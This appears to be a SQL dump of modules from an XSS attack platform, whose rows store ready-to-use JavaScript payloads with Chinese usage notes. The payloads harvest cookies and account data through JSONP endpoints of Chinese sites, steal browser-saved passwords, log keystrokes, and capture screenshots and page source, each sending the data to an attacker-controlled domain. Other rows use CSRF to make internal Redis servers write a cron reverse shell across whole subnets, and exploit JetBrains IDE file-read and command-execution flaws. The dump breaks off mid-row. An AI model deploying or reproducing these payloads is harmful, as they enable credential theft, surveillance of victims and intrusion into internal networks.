
--
-- 转存表中的数据 `oc_module`
--

INSERT INTO `oc_module` (`id`, `userId`, `title`, `keys`, `setkeys`, `code`, `level`, `isOpen`, `description`, `isAudit`, `managerId`, `managerName`, `addTime`) VALUES
(32, 1, '-Jsonp社工模块-', '["content2","content"]', '[]', 'window.onerror=function(){ \r\n  return true; \r\n} \r\nhttp_server = &#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;content=&#039;; \r\nvar info = {}; \r\ninfo.browser = function(){ \r\n  ua = navigator.userAgent.toLowerCase(); \r\n  var rwebkit = /(webkit)[ \\/]([\\w.]+)/; \r\n  var ropera = /(opera)(?:.*version)?[ \\/]([\\w.]+)/; \r\n  var rmsie = /(msie) ([\\w.]+)/; \r\n  var rmozilla = /(mozilla)(?:.*? rv:([\\w.]+))?/; \r\n  var match = rwebkit.exec( ua ) || \r\n  ropera.exec( ua ) || \r\n  rmsie.exec( ua ) || \r\n  ua.indexOf(&quot;compatible&quot;) &lt; 0 &amp;&amp; rmozilla.exec( ua ) || \r\n  []; \r\n  return { \r\n    name: match[1] || &quot;&quot;, version: match[2] || &quot;0&quot; \r\n  }; \r\n}(); \r\ninfo.url =  document.location.href; \r\ninfo.ua = escape(navigator.userAgent); \r\ninfo.lang = navigator.language; \r\ninfo.referrer = document.referrer; \r\ninfo.location = window.location.href; \r\ninfo.toplocation = top.location.href; \r\ninfo.cookie = escape(document.cookie); \r\ninfo.domain = document.domain; \r\ninfo.title = document.title; \r\ninfo.screen = function(){ \r\n  var c = &quot;&quot;; \r\n  if (self.screen) { \r\n    c = screen.width+&quot;x&quot;+screen.height; \r\n  } \r\n  return c; \r\n}(); \r\ninfo.flash = function(){ \r\n  var f=&quot;&quot;,n=navigator; \r\n  if (n.plugins &amp;&amp; n.plugins.length) { \r\n    for (var ii=0;ii&lt;n.plugins.length;ii++) { \r\n      if (n.plugins[ii].name.indexOf(&#039;Shockwave Flash&#039;)!=-1) { \r\n        f=n.plugins[ii].description.split(&#039;Shockwave Flash &#039;)[1]; \r\n        break; \r\n      } \r\n    } \r\n  } \r\n  else \r\n  if (window.ActiveXObject) { \r\n    for (var ii=10;ii&gt;=2;ii--) { \r\n      try { \r\n        var fl=eval(&quot;new ActiveXObject(&#039;ShockwaveFlash.ShockwaveFlash.&quot;+ii+&quot;&#039;);&quot;); \r\n        if (fl) { \r\n          f=ii + &#039;.0&#039;; \r\n          break; \r\n        } \r\n      } \r\n      catch(e) {} \r\n    } \r\n  } \r\n  return f; \r\n}(); \r\nfunction inj_script(a, b) { \r\n  var o = document.createElement(&quot;script&quot;); \r\n  o.src = a; \r\n  if (b) { \r\n    if (!window.ActiveXObject) { \r\n      o.onload = b; \r\n    } \r\n    else { \r\n      o.onreadystatechange = function () { \r\n        if (o.readyState == &#039;loaded&#039; || o.readyState == &#039;complete&#039;) { \r\n          b(); \r\n        } \r\n      } \r\n    } \r\n  } \r\n  document.getElementsByTagName(&quot;body&quot;)[0].appendChild(o); \r\n  return o; \r\n} \r\nfunction json2str(o) { \r\n  if(typeof o == &#039;string&#039;) return o; \r\n  var arr = []; \r\n  var fmt = function(s) { \r\n    if (typeof s == &#039;object&#039; &amp;&amp; s != null) return json2str(s); \r\n    return /^(string|number)$/.test(typeof s) ? &quot;&#039;&quot; + s + &quot;&#039;&quot; : s; \r\n  } \r\n  for (var i in o) arr.push(&quot;&#039;&quot; + i + &quot;&#039;:&quot; + fmt(o[i])); \r\n  return &#039;{&#039; + arr.join(&#039;,&#039;) + &#039;}&#039;; \r\n} \r\nloginInfoJson = function(o){ \r\n  new Image().src = http_server + escape(json2str(o)) + &quot;&amp;content2=taobao&quot;; \r\n} \r\n\r\njsonp1368705676193 = function(o){ \r\n  new Image().src = http_server + escape(json2str(o)) + &quot;&amp;content2=mop&quot;; \r\n} \r\n\r\njsonp1368751970360 = function(o){ \r\n  new Image().src = http_server + escape(json2str(o)) + &quot;&amp;content2=dangdang&quot;; \r\n} \r\n\r\njQuery1368758656634 = function(o){ \r\n  new Image().src = http_server + escape(json2str(o)) + &quot;&amp;content2=renren&quot;; \r\n} \r\nwindow.onload = function(){ \r\n  new Image().src = http_server + escape(json2str(info)) + &quot;&amp;content2=info%20&quot;; \r\n  try{ \r\n    inj_script(&#039;http://i.bendi.taobao.com/userLoginInfo.do?callback=loginInfoJson&amp;t=1368683974713&#039;); \r\n  } \r\n  catch(e){}\r\n\r\n  try{ \r\n    inj_script(&#039;http://passport.mop.com/common/user-info?callback=jsonp1368705676193&#039;); \r\n  } \r\n  catch(e){} \r\n   \r\n  try{ \r\n    inj_script(&#039;http://commapi.dangdang.com/api/toolbar_ads_api.php?jsoncallback=jsonp1368751970360&#039;); \r\n  } \r\n  catch(e){} \r\n   \r\n  try{ \r\n    inj_script(&#039;http://passport.game.renren.com/user/info?callback=jQuery1368758656634&amp;_=1368758656639&#039;); \r\n  } \r\n  catch(e){} \r\n   \r\n  try{ \r\n    inj_script(&#039;http://uis.i.sohu.com/api/passport.jsp?from=roll&amp;_=1361671333278&#039;); \r\n  } \r\n  catch(e){} \r\n   \r\n   \r\n  try{ \r\n    inj_script(&#039;http://www.tianya.cn/api/msg?method=messagesys.selectmessage&amp;params.pageSize=1&amp;params.pageNo=1&amp;_=1368893252433&amp;var=tianya_msg&#039;); \r\n  } \r\n  catch(e){} \r\n\r\n  setTimeout(function(){ \r\n    var o = [_passport]; \r\n    new Image().src = http_server + escape(json2str(o)) + &quot;&amp;content2=sohu&quot;; \r\n  } \r\n  ,3000); \r\n\r\n  setTimeout(function(){ \r\n    var o = tianya_msg.data.list[0].toUserName+&#039;|&#039;+tianya_msg.data.list[0].toUserId; \r\n    new Image().src = http_server + escape(json2str(o)) + &quot;&amp;content2=tianya&quot;; \r\n  } \r\n  ,5000); \r\n};', 0, 1, '利用此模块可以获取对方淘宝账号，淘宝名称，新浪邮箱，网易邮箱，QQ号码，微博ID，百度账号，百度名称等等。如果这些数据通过社工加以深度利用。。。具体需要自己找callbakjsonp接口。', 1, 1, NULL, 1474855692),
(17, 1, 'HTML5截屏', '["screenshot"]', '[]', 'document.write(&quot;&lt;script src=\\&quot;http:\\/\\/替换成你的域名\\/html2canvas.js\\&quot;&gt;&lt;\\/script&gt;&quot;);   \r\n \r\nwindow.onload=function(){\r\n        html2canvas(document.body, {\r\n        onrendered: function(canvas) {\r\n \r\n//下面开始把抓取到的屏幕图片代码传输和接收，由于代码非常的长，只能使用post\r\nxhr=function(){\r\n        var request = false;\r\n        if(window.XMLHttpRequest){\r\n                request = new XMLHttpRequest();\r\n        }else if (window.ActiveXObject){\r\n                try{\r\n                        request = new window.ActiveXObject(&#039;Microsoft.XMLHTTP&#039;);\r\n                }catch(e){\r\n                 \r\n                }\r\n        }\r\n \r\n        return request;\r\n}();\r\n \r\nrequest = function(method,src,argv,content_type){\r\n        xhr.open(method,src,false);\r\n        if(method==&#039;POST&#039;)xhr.setRequestHeader(&#039;Content-type&#039;,content_type);\r\n        xhr.send(argv);                                         //发送POST数据\r\n        return xhr.responseText;\r\n};\r\n \r\nattack_a = function(){\r\n        var src         = &quot;http://替换成你的域名/index.php?do=api&amp;id={projectId}&quot;;                 //post接收地址\r\n        var argv_0      = &quot;&#039;&amp;screenshot=&quot;+canvas.toDataURL();    //post字段名称为screenshot\r\n        request(&quot;POST&quot;,src,argv_0,&quot;application/x-www-form-urlencoded&quot;);\r\n};\r\n \r\nattack_a();\r\n \r\n \r\n                                  }\r\n                                });\r\n                        }', 0, 1, '利用HTML5的功能进行截取客户端屏幕内容。', 1, 1, 'admin', 1412060272),
(18, 1, '获取浏览器记住的明文密码', '["username","password"]', '["type1"," type2","id1","id2","name1","name2"]', 'function create_body(){\r\n		document.write(&#039;&lt;body&gt;&lt;/body&gt;&#039;);\r\n	}\r\n	function create_form(user) { /*获取明文密码*/\r\n		var f = document.createElement(&quot;form&quot;);\r\n		f.style.display= &quot;none&quot;\r\n		document.getElementsByTagName(&quot;body&quot;)[0].appendChild(f);\r\n		var e1 = document.createElement(&quot;input&quot;);\r\n		e1.type = &quot;{set.type1}&quot;;\r\n		e1.name = &quot;{set.name1}&quot;;\r\n                e1.id = &quot;{set.id1}&quot;;\r\n		f.appendChild(e1);\r\n		var e = document.createElement(&quot;input&quot;);\r\n		e.name = &quot;{set.name2}&quot;;\r\n                e.type = &quot;{set.type2}&quot;;\r\n                e.id = &quot;{set.id2}&quot;;\r\n		f.appendChild(e);\r\n		\r\n		setTimeout(function () {\r\n			username = document.getElementById(&quot;{set.id1}&quot;).value;\r\n                        password = document.getElementById(&quot;{set.id2}&quot;).value;\r\n			var newimg = new Image();\r\n                       newimg.src=&quot;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;username=&quot;+username+&quot;&amp;password=&quot;+password;\r\n		}, 2000); // 时间竞争\r\n	}\r\n\r\n	\r\n	create_form(&#039;&#039;);\r\n', 0, 1, '参考 余弦大牛的文章，写了个模块http://hi.baidu.com/zeracker/item/c2de19cbdfa013db964452cb\r\ntype id name 为要获取的表单页面 input标签属性值，测试通过 chrome firefox 360浏览器。 只要是 同域的 都可获取！\r\n比如 要获取的浏览器已记录的密码为webvul.com/admin.php 文件的 那么在\r\nwebvul.com/admin/user/list.php页面插入 也可以获取到！\r\n', 1, 1, 'admin', 1447467410),
(19, 1, '获取页面源码', '["code"]', '["filename"]', 'var cr;\r\nif (document.charset) {\r\n  cr = document.charset\r\n} else if (document.characterSet) {\r\n  cr = document.characterSet\r\n};\r\nfunction createXmlHttp() {\r\n  if (window.XMLHttpRequest) {\r\n    xmlHttp = new XMLHttpRequest()\r\n  } else {\r\n    var MSXML = new Array(&#039;MSXML2.XMLHTTP.5.0&#039;, &#039;MSXML2.XMLHTTP.4.0&#039;, &#039;MSXML2.XMLHTTP.3.0&#039;, &#039;MSXML2.XMLHTTP&#039;, &#039;Microsoft.XMLHTTP&#039;);\r\n    for (var n = 0; n &lt; MSXML.length; n++) {\r\n      try {\r\n        xmlHttp = new ActiveXObject(MSXML[n]);\r\n        break\r\n      } catch (e) {\r\n      }\r\n    }\r\n  }\r\n}\r\ncreateXmlHttp();\r\nxmlHttp.onreadystatechange = writeSource;\r\nxmlHttp.open(&#039;GET&#039;, &#039;{set.filename}&#039;, true);\r\nxmlHttp.send(null);\r\nfunction writeSource() {\r\n  if (xmlHttp.readyState == 4) {\r\n      var code = BASE64.encoder(xmlHttp.responseText);\r\n      xssPost(&#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&#039;, code);\r\n  }\r\n}\r\n\r\n  function xssPost(url, postStr) {\r\n    var de;\r\n    de = document.body.appendChild(document.createElement(&#039;iframe&#039;));\r\n    de.src = &#039;about:blank&#039;;\r\n    de.height = 1;\r\n    de.width = 1;\r\n    de.contentDocument.write(&#039;&lt;form method=&quot;POST&quot; action=&quot;&#039; + url + &#039;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&#039; + postStr + &#039;&quot;/&gt;&lt;/form&gt;&#039;);\r\n    de.contentDocument.forms[0].submit();\r\n    de.style.display = &#039;none&#039;;\r\n}\r\n/**\r\n *create by 2012-08-25 pm 17:48\r\n *@author hexinglun@gmail.com\r\n *BASE64 Encode and Decode By UTF-8 unicode\r\n *可以和java的BASE64编码和解码互相转化\r\n */\r\n(function(){\r\n	var BASE64_MAPPING = [\r\n		&#039;A&#039;,&#039;B&#039;,&#039;C&#039;,&#039;D&#039;,&#039;E&#039;,&#039;F&#039;,&#039;G&#039;,&#039;H&#039;,\r\n		&#039;I&#039;,&#039;J&#039;,&#039;K&#039;,&#039;L&#039;,&#039;M&#039;,&#039;N&#039;,&#039;O&#039;,&#039;P&#039;,\r\n		&#039;Q&#039;,&#039;R&#039;,&#039;S&#039;,&#039;T&#039;,&#039;U&#039;,&#039;V&#039;,&#039;W&#039;,&#039;X&#039;,\r\n		&#039;Y&#039;,&#039;Z&#039;,&#039;a&#039;,&#039;b&#039;,&#039;c&#039;,&#039;d&#039;,&#039;e&#039;,&#039;f&#039;,\r\n		&#039;g&#039;,&#039;h&#039;,&#039;i&#039;,&#039;j&#039;,&#039;k&#039;,&#039;l&#039;,&#039;m&#039;,&#039;n&#039;,\r\n		&#039;o&#039;,&#039;p&#039;,&#039;q&#039;,&#039;r&#039;,&#039;s&#039;,&#039;t&#039;,&#039;u&#039;,&#039;v&#039;,\r\n		&#039;w&#039;,&#039;x&#039;,&#039;y&#039;,&#039;z&#039;,&#039;0&#039;,&#039;1&#039;,&#039;2&#039;,&#039;3&#039;,\r\n		&#039;4&#039;,&#039;5&#039;,&#039;6&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&#039;+&#039;,&#039;/&#039;\r\n	];\r\n\r\n	/**\r\n	 *ascii convert to binary\r\n	 */\r\n	var _toBinary = function(ascii){\r\n		var binary = new Array();\r\n		while(ascii &gt; 0){\r\n			var b = ascii%2;\r\n			ascii = Math.floor(ascii/2);\r\n			binary.push(b);\r\n		}\r\n		/*\r\n		var len = binary.length;\r\n		if(6-len &gt; 0){\r\n			for(var i = 6-len ; i &gt; 0 ; --i){\r\n				binary.push(0);\r\n			}\r\n		}*/\r\n		binary.reverse();\r\n		return binary;\r\n	};\r\n\r\n	/**\r\n	 *binary convert to decimal\r\n	 */\r\n	var _toDecimal  = function(binary){\r\n		var dec = 0;\r\n		var p = 0;\r\n		for(var i = binary.length-1 ; i &gt;= 0 ; --i){\r\n			var b = binary[i];\r\n			if(b == 1){\r\n				dec += Math.pow(2 , p);\r\n			}\r\n			++p;\r\n		}\r\n		return dec;\r\n	};\r\n\r\n	/**\r\n	 *unicode convert to utf-8\r\n	 */\r\n	var _toUTF8Binary = function(c , binaryArray){\r\n		var mustLen = (8-(c+1)) + ((c-1)*6);\r\n		var fatLen = binaryArray.length;\r\n		var diff = mustLen - fatLen;\r\n		while(--diff &gt;= 0){\r\n			binaryArray.unshift(0);\r\n		}\r\n		var binary = [];\r\n		var _c = c;\r\n		while(--_c &gt;= 0){\r\n			binary.push(1);\r\n		}\r\n		binary.push(0);\r\n		var i = 0 , len = 8 - (c+1);\r\n		for(; i &lt; len ; ++i){\r\n			binary.push(binaryArray[i]);\r\n		}\r\n\r\n		for(var j = 0 ; j &lt; c-1 ; ++j){\r\n			binary.push(1);\r\n			binary.push(0);\r\n			var sum = 6;\r\n			while(--sum &gt;= 0){\r\n				binary.push(binaryArray[i++]);\r\n			}\r\n		}\r\n		return binary;\r\n	};\r\n\r\n	var __BASE64 = {\r\n			/**\r\n			 *BASE64 Encode\r\n			 */\r\n			encoder:function(str){\r\n				var base64_Index = [];\r\n				var binaryArray = [];\r\n				for(var i = 0 , len = str.length ; i &lt; len ; ++i){\r\n					var unicode = str.charCodeAt(i);\r\n					var _tmpBinary = _toBinary(unicode);\r\n					if(unicode &lt; 0x80){\r\n						var _tmpdiff = 8 - _tmpBinary.length;\r\n						while(--_tmpdiff &gt;= 0){\r\n							_tmpBinary.unshift(0);\r\n						}\r\n						binaryArray = binaryArray.concat(_tmpBinary);\r\n					}else if(unicode &gt;= 0x80 &amp;&amp; unicode &lt;= 0x7FF){\r\n						binaryArray = binaryArray.concat(_toUTF8Binary(2 , _tmpBinary));\r\n					}else if(unicode &gt;= 0x800 &amp;&amp; unicode &lt;= 0xFFFF){//UTF-8 3byte\r\n						binaryArray = binaryArray.concat(_toUTF8Binary(3 , _tmpBinary));\r\n					}else if(unicode &gt;= 0x10000 &amp;&amp; unicode &lt;= 0x1FFFFF){//UTF-8 4byte\r\n						binaryArray = binaryArray.concat(_toUTF8Binary(4 , _tmpBinary));	\r\n					}else if(unicode &gt;= 0x200000 &amp;&amp; unicode &lt;= 0x3FFFFFF){//UTF-8 5byte\r\n						binaryArray = binaryArray.concat(_toUTF8Binary(5 , _tmpBinary));\r\n					}else if(unicode &gt;= 4000000 &amp;&amp; unicode &lt;= 0x7FFFFFFF){//UTF-8 6byte\r\n						binaryArray = binaryArray.concat(_toUTF8Binary(6 , _tmpBinary));\r\n					}\r\n				}\r\n\r\n				var extra_Zero_Count = 0;\r\n				for(var i = 0 , len = binaryArray.length ; i &lt; len ; i+=6){\r\n					var diff = (i+6)-len;\r\n					if(diff == 2){\r\n						extra_Zero_Count = 2;\r\n					}else if(diff == 4){\r\n						extra_Zero_Count = 4;\r\n					}\r\n					//if(extra_Zero_Count &gt; 0){\r\n					//	len += extra_Zero_Count+1;\r\n					//}\r\n					var _tmpExtra_Zero_Count = extra_Zero_Count;\r\n					while(--_tmpExtra_Zero_Count &gt;= 0){\r\n						binaryArray.push(0);\r\n					}\r\n					base64_Index.push(_toDecimal(binaryArray.slice(i , i+6)));\r\n				}\r\n\r\n				var base64 = &#039;&#039;;\r\n				for(var i = 0 , len = base64_Index.length ; i &lt; len ; ++i){\r\n					base64 += BASE64_MAPPING[base64_Index[i]];\r\n				}\r\n\r\n				for(var i = 0 , len = extra_Zero_Count/2 ; i &lt; len ; ++i){\r\n					base64 += &#039;=&#039;;\r\n				}\r\n				return base64;\r\n			},\r\n			/**\r\n			 *BASE64  Decode for UTF-8 \r\n			 */\r\n			decoder : function(_base64Str){\r\n				var _len = _base64Str.length;\r\n				var extra_Zero_Count = 0;\r\n				/**\r\n				 *计算在进行BASE64编码的时候，补了几个0\r\n				 */\r\n				if(_base64Str.charAt(_len-1) == &#039;=&#039;){\r\n					//alert(_base64Str.charAt(_len-1));\r\n					//alert(_base64Str.charAt(_len-2));\r\n					if(_base64Str.charAt(_len-2) == &#039;=&#039;){//两个等号说明补了4个0\r\n						extra_Zero_Count = 4;\r\n						_base64Str = _base64Str.substring(0 , _len-2);\r\n					}else{//一个等号说明补了2个0\r\n						extra_Zero_Count = 2;\r\n						_base64Str = _base64Str.substring(0 , _len - 1);\r\n					}\r\n				}\r\n\r\n				var binaryArray = [];\r\n				for(var i = 0 , len = _base64Str.length; i &lt; len ; ++i){\r\n					var c = _base64Str.charAt(i);\r\n					for(var j = 0 , size = BASE64_MAPPING.length ; j &lt; size ; ++j){\r\n						if(c == BASE64_MAPPING[j]){\r\n							var _tmp = _toBinary(j);\r\n							/*不足6位的补0*/\r\n							var _tmpLen = _tmp.length;\r\n							if(6-_tmpLen &gt; 0){\r\n								for(var k = 6-_tmpLen ; k &gt; 0 ; --k){\r\n									_tmp.unshift(0);\r\n								}\r\n							}\r\n							binaryArray = binaryArray.concat(_tmp);\r\n							break;\r\n						}\r\n					}\r\n				}\r\n\r\n				if(extra_Zero_Count &gt; 0){\r\n					binaryArray = binaryArray.slice(0 , binaryArray.length - extra_Zero_Count);\r\n				}\r\n\r\n				var unicode = [];\r\n				var unicodeBinary = [];\r\n				for(var i = 0 , len = binaryArray.length ; i &lt; len ; ){\r\n					if(binaryArray[i] == 0){\r\n						unicode=unicode.concat(_toDecimal(binaryArray.slice(i,i+8)));\r\n						i += 8;\r\n					}else{\r\n						var sum = 0;\r\n						while(i &lt; len){\r\n							if(binaryArray[i] == 1){\r\n								++sum;\r\n							}else{\r\n								break;\r\n							}\r\n							++i;\r\n						}\r\n						unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+1 , i+8-sum));\r\n						i += 8 - sum;\r\n						while(sum &gt; 1){\r\n							unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+2 , i+8));\r\n							i += 8;\r\n							--sum;\r\n						}\r\n						unicode = unicode.concat(_toDecimal(unicodeBinary));\r\n						unicodeBinary = [];\r\n					}\r\n				}\r\n				return unicode;\r\n			}\r\n	};\r\n\r\n	window.BASE64 = __BASE64;\r\n})();', 0, 1, '获取客户端指定页面源代码,采用post提交以防止字数限制，采用base64编码解决提交代码不完整', 1, 1, 'admin', 1454382489),
(20, 1, 'CSRF操作Redis写文件', '[]', '["ip","port","dir","filename","content"]', 'var ip = &#039;{set.ip}&#039;;\r\nvar port= &#039;{set.port}&#039;;\r\nvar dir = &#039;{set.dir}&#039;;\r\nvar filename = &#039;{set.filename}&#039;;\r\nvar content = &#039;{set.content}&#039;;\r\nvar url = &quot;http://&quot; + ip + &quot;:&quot; + port;\r\n\r\nvar cmd = new XMLHttpRequest();\r\ncmd.open(&quot;POST&quot;,  url);\r\ncmd.send(&#039;eval \\&#039;&#039; + &#039;redis.call(\\&quot;set\\&quot;, \\&quot;hacked\\&quot;, &quot;\\\\r\\\\n\\\\n&#039;+content+&#039;\\\\n\\\\n\\\\n\\\\n\\&quot;); redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dir\\&quot;, \\&quot;&#039; + dir + &#039;/\\&quot;); redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dbfilename\\&quot;, \\&quot;&#039;+filename+&#039;\\&quot;); &#039; + &#039;\\&#039; 0&#039; + &quot;\\r\\n&quot;);\r\n \r\nvar cmd = new XMLHttpRequest();\r\ncmd.open(&quot;POST&quot;,  url);\r\ncmd.send(&#039;save\\r\\n&#039;);', 0, 1, '利用ajax访问redis写文件，可利用此方法获取目标主机权限;\r\n常用目录：/root/.ssh  /var/spool/cron/ \r\n\r\n只要一个xss漏洞打入内网不是梦', 1, 1, 'admin', 1469519638),
(21, 1, 'xss+csrf+redis自动化入侵内网', '[]', '["ip","lhost","lport"]', 'var ip = &#039;{set.ip}&#039;;\r\nvar iparr = arr = ip.split(&quot;.&quot;);\r\nfor(var i=0;i&lt;255;i++) {\r\n	var attkip = iparr [0] + &quot;.&quot; + iparr [1] + &quot;.&quot; + iparr [2] + &quot;.&quot; + i;\r\n	send(attkip);\r\n}\r\nfunction send(ip) {\r\n	var port= &#039;6379&#039;;\r\n	var dir = &#039;/var/spool/cron/&#039;;\r\n	var filename = &#039;root&#039;;\r\n	var content = &#039;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/{set.lhost}/{set.lport} 0&gt;&amp;1&#039;;\r\n	var url = &quot;http://&quot; + ip + &quot;:&quot; + port;\r\n\r\n	var cmd = new XMLHttpRequest();\r\n	cmd.open(&quot;POST&quot;,  url);\r\n	cmd.send(&#039;eval \\&#039;&#039; + &#039;redis.call(\\&quot;set\\&quot;, \\&quot;hacked\\&quot;, &quot;\\\\r\\\\n\\\\n&#039;+content+&#039;\\\\n\\\\n\\\\n\\\\n\\&quot;); redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dir\\&quot;, \\&quot;&#039; + dir + &#039;/\\&quot;); redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dbfilename\\&quot;, \\&quot;&#039;+filename+&#039;\\&quot;); &#039; + &#039;\\&#039; 0&#039; + &quot;\\r\\n&quot;);\r\n	 \r\n	var cmd = new XMLHttpRequest();\r\n	cmd.open(&quot;POST&quot;,  url);\r\n	cmd.send(&#039;save\\r\\n&#039;);\r\n	\r\n}', 0, 1, '在http://替换成你的域名/xss.php?do=module&amp;act=set&amp;id=20基础下改进，批量操作内网redis\r\n\r\n参数说明：\r\nip:你要打的内网ip段，填10.10.2.1 则打内网的10.10.2.1-10.10.2.255\r\n\r\nlhost:你的服务器，用nc监听的ip\r\nlport：nc监听的端口', 1, 1, 'admin', 1469519730),
(23, 1, '自动获取内网ip打内网redis', '[]', '["lhost","lport"]', '    ipList = [];\n    var webrtcxss = {\n    webrtc        : function(callback){\n        var ip_dups           = {};\n        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;\n        var mediaConstraints  = {\n            optional: [{RtpDataChannels: true}]\n        };\n        var servers = undefined;\n        if(window.webkitRTCPeerConnection){\n            servers = {iceServers: []};\n        }\n        var pc = new RTCPeerConnection(servers, mediaConstraints);\n        pc.onicecandidate = function(ice){\n            if(ice.candidate){\n                var ip_regex        = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;\n                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; \n                if(ip_dups[ip_addr] === undefined)\n                callback(ip_addr);\n                ip_dups[ip_addr]    = true;\n            }\n        };\n        pc.createDataChannel(&quot;&quot;);\n        pc.createOffer(function(result){\n            pc.setLocalDescription(result, function(){});\n        });\n    },\n    getIp        : function(){\n        this.webrtc(function(ip){\n            ipList.push(ip);\n        });\n    }\n}\nwebrtcxss.getIp()\nsetTimeout(function() {\n    for(var i in ipList) {\n        if(ipList[i]) {\n            var iparr = ipList[i].split(&quot;.&quot;);\n            for(var i=0;i&lt;255;i++) {\n                var attkip = iparr [0] + &quot;.&quot; + iparr [1] + &quot;.&quot; + iparr [2] + &quot;.&quot; + i;\n                send(attkip);\n            }\n        }\n    }\n}, 300);\n\nfunction send(ip) {\n    var port= &#039;6379&#039;;\n    var dir = &#039;/var/spool/cron/&#039;;\n    var filename = &#039;root&#039;;\n    var content = &#039;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/{set.lhost}/{set.lport} 0&gt;&amp;1&#039;;\n    var url = &quot;http://&quot; + ip + &quot;:&quot; + port;\n\n    var cmd = new XMLHttpRequest();\n    cmd.open(&quot;POST&quot;,  url);\n    cmd.send(&#039;eval \\&#039;&#039; + &#039;redis.call(\\&quot;set\\&quot;, \\&quot;hacked\\&quot;, &quot;\\\\r\\\\n\\\\n&#039;+content+&#039;\\\\n\\\\n\\\\n\\\\n\\&quot;); redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dir\\&quot;, \\&quot;&#039; + dir + &#039;/\\&quot;); redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dbfilename\\&quot;, \\&quot;&#039;+filename+&#039;\\&quot;); &#039; + &#039;\\&#039; 0&#039; + &quot;\\r\\n&quot;);\n     \n    var cmd = new XMLHttpRequest();\n    cmd.open(&quot;POST&quot;,  url);\n    cmd.send(&#039;save\\r\\n&#039;);\n    \n}', 0, 1, '详细说明：http://替换成你的域名/1355.html\r\n\r\n参数说明：\r\nlhost:你的服务器，用nc监听的ip\r\nlport：nc监听的端口\r\n\r\n自动获取内网IP，自动打内网255机器', 1, 1, 'admin', 1470215023),
(25, 1, '键盘记录', '["location","referrer","log"]', '[]', 'var ks=&#039;&#039;;\ndocument.onkeypress = function(e) {\n    get = window.event?event:e;\n    key = get.keyCode?get.keyCode:get.charCode;\n    key = String.fromCharCode(key);\n    ks+=key;\n}\nwindow.setInterval(function(){\nvar b=new Image();\nb.src=&#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;referrer=&#039;+escape(document.referrer)+&#039;&amp;log=&#039;+ks;\n    ks = &#039;&#039;;\n}, 4000);', 0, 1, '', 1, 1, 'admin', 1474444483),
(26, 1, 'JetBrains ide任意文件读取', '["content","location","referrer"]', '["projectname","filepath"]', 'var xhr = new XMLHttpRequest();\r\nxhr.open(&quot;GET&quot;, &quot;http://localhost:63342/{set.projectname}/{set.filepath}&quot;, true);\r\nxhr.onload = function() {\r\nvar content = xhr.responseText;\r\nvar b=new Image();\r\nb.src=&#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;referrer=&#039;+escape(document.referrer)+&#039;&amp;content=&#039;+content;\r\n};\r\nxhr.send();\r\n', 0, 1, 'http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/\r\n\r\n2016-08-15 爆的漏洞', 1, 1, 'admin', 1474592152),
(27, 1, 'JetBrains远程命令执行', '[]', '["smbserver"]', 'var xhr = new XMLHttpRequest();\r\nxhr.open(&quot;POST&quot;, &quot;http://127.0.0.1:63342/api/internal&quot;, true);\r\nxhr.send(&#039;{&quot;url&quot;: &quot;jetbrains://whatever/open/\\\\\\\\\\\\\\\\{set.smbserver}\\\\\\\\smb\\\\\\\\intruder&quot;}&#039;);', 0, 1, 'http://www.ohvirus.com/1.code/2016-08-30-pycharm-ide-rce-vuln.html\r\n\r\n2016-08-30爆的最新漏洞  实际利用起来有难度。作用并不是太大。（还是收着吧。）', 1, 1, 'admin', 1474592340),
(29, 1, '获取内网ip', '["location","ip"]', '[]', 'function getIPs(callback) {\r\n    var ip_dups = {};\r\n\r\n    //compatibility for firefox and chrome\r\n    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;\r\n    var useWebKit = !!window.webkitRTCPeerConnection;\r\n\r\n    //bypass naive webrtc blocking using an iframe\r\n    if (!RTCPeerConnection) {\r\n        //NOTE: you need to have an iframe in the page right above the script tag\r\n        //\r\n        //&lt;iframe id=&quot;iframe&quot; sandbox=&quot;allow-same-origin&quot; style=&quot;display: none&quot;&gt;&lt;/iframe&gt;\r\n        //&lt;script&gt;...getIPs called in here...\r\n        //\r\n        var win = iframe.contentWindow;\r\n        RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;\r\n        useWebKit = !!win.webkitRTCPeerConnection;\r\n    }\r\n\r\n    //minimal requirements for data connection\r\n    var mediaConstraints = {\r\n        optional: [{\r\n            RtpDataChannels: true\r\n        }]\r\n    };\r\n\r\n    var servers = {\r\n        iceServers: [{\r\n            urls: &quot;stun:stun.services.mozilla.com&quot;\r\n        }]\r\n    };\r\n\r\n    //construct a new RTCPeerConnection\r\n    var pc = new RTCPeerConnection(servers, mediaConstraints);\r\n\r\n    function handleCandidate(candidate) {\r\n        //match just the IP address\r\n        var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/\r\n        var ip_addr = ip_regex.exec(candidate)[1];\r\n\r\n        //remove duplicates\r\n        if (ip_dups[ip_addr] === undefined) callback(ip_addr);\r\n\r\n        ip_dups[ip_addr] = true;\r\n    }\r\n\r\n    //listen for candidate events\r\n    